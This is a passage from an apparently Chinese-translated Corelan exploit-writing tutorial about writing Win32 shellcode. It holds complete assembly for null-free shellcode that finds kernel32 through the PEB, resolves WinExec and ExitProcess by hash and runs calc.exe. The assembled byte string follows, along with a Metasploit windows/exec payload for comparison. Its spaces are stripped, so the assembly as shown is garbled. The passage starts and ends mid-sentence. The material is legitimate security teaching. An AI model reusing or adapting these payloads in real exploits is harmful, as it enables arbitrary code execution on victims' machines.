pusheax ;put0onstack
call[ebp+8] ;ExitProcess(0)
这个代码产生超过340字节的机器码，并且包括45个null字节！因此作为一个小练习，你
可以试着将这个shellcode弄成没有null字节（不对整个payload进行编码）:-)
将会开个小头（或者我会给出一些结论--随你自己去发现）：没有null字节的“calc”shellcode
的例子（calcnull.asm）将也能在windows7上工作：
;Sampleshellcodethatwillpopcalc
;WrittenbyPeterVanEeckhoutte
;http://www.corelan.be:8800
;versionwithoutnullbytes
[Section.text]
[BITS32]
global_start
_start:
;getPC
FLDPI
FSTENV[ESP-0xC]
popebp ;putbaseaddressinebp
;findkernel32
;Technique:PEB(Win7compatible)
pushesi ;saveesi
xoreax,eax ;cleareax
xorebx,ebx
movbl,0x30
moveax,[fs:ebx] ;getapointertothePEB
moveax,[eax+0x0C] ;getPEB->Ldr
moveax,[eax+0x14] ;getPEB->Ldr.InMemoryOrderModuleList.Flink(1stentry)
pusheax
popesi
moveax,[esi] ;getthenextentry(2ndentry)
pusheax
popesi
moveax,[esi] ;getthenextentry(3rdentry)
moveax,[eax+0x10] ;getthe3rdentriesbaseaddress(kernel32.dll)
popesi ;recoveresi
;
movedx,eax ;savebaseaddressofkernel32inedx
;getpointertoWinExechash
;pushhashtostack
push0x0E8AFE98
pushedx ;pushpointertokernel32
;baseaddresstostack
;lookupfunctionWinExec
;insteadof"callfind_function"
;wewilluseebp+offsetandkeepaddressinebx
movebx,ebp
addebx,0x11111179 ;avoidnullbytes
subebx,0x11111111
callebx ;(=ebp+59=find_function)
;executecalc
push0x58202020 ;X+spaces.
;Xwillbeoverwrittenwithnull
push0x6578652E
push0x636C6163
movesi,esp
xorecx,ecx
mov[esi+0x8],cl ;overwriteXwithnull
incecx
pushecx ;param1(window_state)
pushesi ;paramcommandtorun
calleax ;eax=WinExec
;findExitProcess()
;firstgetbaseaddressofkernel32back
;fromstack
popeax
popeax
popeax
popedx ;hereitis
push0x73E2D87E ;hashofExitProcess
pushedx ;baseaddressofkernel32
callebx ;getfunction-ebxstillpointstofind_function
;eaxnowcontainsExitProcessfunctionaddress
xorecx,ecx
pushecx ;pushzero(argument)onstack
calleax ;exitprocess(0)
;=======Function:Findfunction============
find_function:
pushad ;saveallregisters
movebp, [esp + 0x24] ;putbaseaddressofmodulethatisbeing
;loadedinebp
moveax, [ebp + 0x3c] ;skipoverMSDOSheader
movedx, [ebp + eax + 0x78];gotoexporttableandputrelativeaddress
;inedx
addedx, ebp ;addbaseaddresstoit.
;edx=absoluteaddressofexporttable
movecx, [edx + 0x18] ;setupcounterECX
;(howmanyexporteditemsareinarray?)
movebx, [edx + 0x20] ;putnamestablerelativeoffsetinebx
addebx, ebp ;addbaseaddresstoit.
;ebx=absoluteaddressofnamestable
find_function_loop:
jecxz find_function_finished ;ifecx=0,thenlastsymbolhasbeenchecked.
;(shouldneverhappen)
;unlessfunctioncouldnotbefound
dececx ;ecx=ecx-1
movesi, [ebx + ecx * 4] ;getrelativeoffsetofthenameassociated
;withthecurrentsymbol
;andstoreoffsetinesi
addesi, ebp ;addbaseaddress.
;esi=absoluteaddressofcurrentsymbol
compute_hash:
xoredi, edi ;zerooutedi
xoreax, eax ;zeroouteax
cld ;cleardirectionflag.
;willmakesurethatitincrementsinsteadof
;decrementswhenusinglods*
compute_hash_again:
lodsb ;loadbytesatesi(currentsymbolname)
;intoal,+incrementesi
testal, al ;bitwisetest:
;seeifendofstringhasbeenreached
jz compute_hash_finished ;ifzeroflagisset=endofstringreached
roredi, 0xd ;ifzeroflagisnotset,rotatecurrent
;valueofhash13bitstotheright
addedi, eax ;addcurrentcharacterofsymbolname
;tohashaccumulator
jmpcompute_hash_again ;continueloop
compute_hash_finished:
find_function_compare:
cmpedi, [esp + 0x28] ;seeifcomputedhashmatchesrequestedhash
;theonewepushed,atesp+0x28
;edi=currentcomputedhash
;esi=currentfunctionname(string)
jnzfind_function_loop ;nomatch,gotonextsymbol
movebx, [edx + 0x24] ;ifmatch:extractordinalstable
;relativeoffsetandputinebx
addebx, ebp ;addbaseaddress.
;ebx=absoluteaddressof
;ordinalsaddresstable
movcx, [ebx + 2 * ecx] ;getcurrentsymbolordinalnumber(2bytes)
movebx, [edx + 0x1c] ;getaddresstablerelativeandputinebx
addebx, ebp ;addbaseaddress.
;ebx=absoluteaddressofaddresstable
moveax, [ebx + 4 * ecx] ;getrelativefunctionoffsetfromitsordinal
;andputineax
addeax, ebp ;addbaseaddress.
;eax=absoluteaddressoffunctionaddress
mov[esp + 0x1c], eax ;overwritestackcopyofeaxsopopad
;willreturnfunctionaddressineax
find_function_finished:
popad ;retrieveoriginalregisters.
;eaxwillcontainfunctionaddress
C:\shellcode>"c:\ProgramFiles\nasm\nasm.exe"
calcnonull.asm-ocalcnonull.bin
C:\shellcode>perlpveReadbin.plcalcnonull.bin
Readingcalcnonull.bin
Read185bytes
"\xd9\xeb\x9b\xd9\x74\x24\xf4\x5d"
"\x56\x31\xc0\x31\xdb\xb3\x30\x64"
"\x8b\x03\x8b\x40\x0c\x8b\x40\x14"
"\x50\x5e\x8b\x06\x50\x5e\x8b\x06"
"\x8b\x40\x10\x5e\x89\xc2\x68\x98"
"\xfe\x8a\x0e\x52\x89\xeb\x81\xc3"
"\x79\x11\x11\x11\x81\xeb\x11\x11"
"\x11\x11\xff\xd3\x68\x20\x20\x20"
"\x58\x68\x2e\x65\x78\x65\x68\x63"
"\x61\x6c\x63\x89\xe6\x31\xc9\x88"
"\x4e\x08\x41\x51\x56\xff\xd0\x58"
"\x58\x58\x5a\x68\x7e\xd8\xe2\x73"
"\x52\xff\xd3\x31\xc9\x51\xff\xd0"
"\x60\x8b\x6c\x24\x24\x8b\x45\x3c"
"\x8b\x54\x05\x78\x01\xea\x8b\x4a"
"\x18\x8b\x5a\x20\x01\xeb\xe3\x37"
"\x49\x8b\x34\x8b\x01\xee\x31\xff"
"\x31\xc0\xfc\xac\x84\xc0\x74\x0a"
"\xc1\xcf\x0d\x01\xc7\xe9\xf1\xff"
"\xff\xff\x3b\x7c\x24\x28\x75\xde"
"\x8b\x5a\x24\x01\xeb\x66\x8b\x0c"
"\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04"
"\x8b\x01\xe8\x89\x44\x24\x1c\x61"
"\xc3";
Numberofnullbytes:0
185字节（看起来不错）:-（) 但是我们还会在文章的结尾部分来看下怎么才能使这个shellcode
变得更小）
将这个和Metasploit上的进行比较：
./msfpayloadwindows/execCMD=calcEXTIFUNC=processP
#windows/exec-196bytes
#http://www.metasploit.com
#EXITFUNC=process,CMD=calc
my$buf=
"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52".
"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26".
"\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d".
"\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0".
"\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b".
"\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff".
"\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d".
"\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b".
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44".
"\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b".
"\x12\xeb\x86\x5d\x6a\x01\x8d\x85\xb9\x00\x00\x00\x50\x68".
"\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95".
"\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb".
"\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c\x63\x00";
=>196字节，并且不包含null字节。
（当然，Metasploit产生的代码可能会更通用一点，可能更好一点...但是-我猜我的代码也不